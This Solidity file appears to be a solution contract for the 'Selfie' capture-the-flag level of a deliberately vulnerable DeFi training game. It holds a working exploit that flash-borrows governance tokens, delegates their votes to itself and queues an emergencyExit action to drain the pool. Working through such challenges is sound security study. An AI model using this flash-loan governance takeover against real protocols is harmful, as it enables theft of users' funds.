// SPDX-License-Identifier: MIT
pragma solidity =0.8.25;
import {Test, console} from "forge-std/Test.sol";
import {IERC3156FlashBorrower} from "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
import {IERC3156FlashLender} from "@openzeppelin/contracts/interfaces/IERC3156FlashLender.sol";
import {DamnValuableVotes} from "../DamnValuableVotes.sol";
import {SelfiePool} from "./SelfiePool.sol";
import {SimpleGovernance} from "./SimpleGovernance.sol"; 

contract SelfieAttack is IERC3156FlashBorrower {

    IERC3156FlashLender public immutable lender;
    SimpleGovernance public immutable governance; 
    DamnValuableVotes public immutable token; 
    bytes32 private constant CALLBACK_SUCCESS = keccak256("ERC3156FlashBorrower.onFlashLoan");


    constructor(address _lender, address _token, address _governance) {
        lender = IERC3156FlashLender(_lender);
        token = DamnValuableVotes(_token);
        governance = SimpleGovernance(_governance);
    }
    function attack(uint256 amount) external {
        // Initiate the flash loan
        lender.flashLoan(
            IERC3156FlashBorrower(address(this)), // receiver
            address(token),                       // token to borrow
            amount,                               // amount to borrow
            ""                                    // optional data
        );

        

    }

    function recover(address recovery) external {
        uint256 balance = token.balanceOf(address(this));
        require(balance > 0, "Nothing to recover");

        token.transfer(recovery, balance);
    }

    function onFlashLoan(
        address initiator,
        address _token,
        uint256 amount,
        uint256 fee,
        bytes calldata data
    ) external override returns (bytes32) {
        require(msg.sender == address(lender), "Only lender can call this");
        require(initiator == address(this), "Only this contract can initiate");

        // Attack Below
        
        // Craft the payload: call pool.drainAllFunds(attacker)
        bytes memory payload = abi.encodeWithSignature(
            "emergencyExit(address)",
            address(this) // attacker address
        );

        console.log("amount of tokens borrowed", amount);
        console.log("Token votes before delegation", token.getVotes(address(this))); 
        console.log("Token balance", token.balanceOf(address(this))); 

        token.delegate(address(this));

        console.log("Token votes after delegation", token.getVotes(address(this))); 



        // Queue the malicious action
        governance.queueAction(
            address(lender),
            0,
            payload
        );

        // Approve the lender to spend the tokens
        DamnValuableVotes(_token).approve(address(lender), amount + fee);
        
        return CALLBACK_SUCCESS;
    }

}